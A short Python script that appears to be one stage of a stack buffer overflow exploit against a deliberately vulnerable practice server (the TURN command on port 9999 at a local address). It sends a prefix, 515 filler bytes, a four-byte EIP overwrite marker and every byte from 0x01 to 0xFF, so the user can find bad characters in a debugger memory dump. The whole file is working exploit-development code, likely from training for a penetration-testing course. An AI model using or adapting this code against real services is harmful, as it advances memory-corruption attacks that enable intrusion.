#!/usr/bin/env python3
import socket

IP = "192.168.0.14"
PORT = 9999
PREFIX = b"TURN /.:/"

# Generates all byte possibilities from \x01 through \x0ff (\x00 excluded by default)
bad_char_test = bytes([i for i in range(1, 256)])

# Notice we use pure byte format (b"") here for safety
payload = PREFIX + (b"A" * 515) + b"BBBB" + bad_char_test

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((IP, PORT))
        print("[*] Sending all byte characters to check for badchars...")
        s.send(payload)
        print("[+] Sent. Inspect ESP in your memory dump window.")
except socket.error:
    print("[-] Connection failed.")

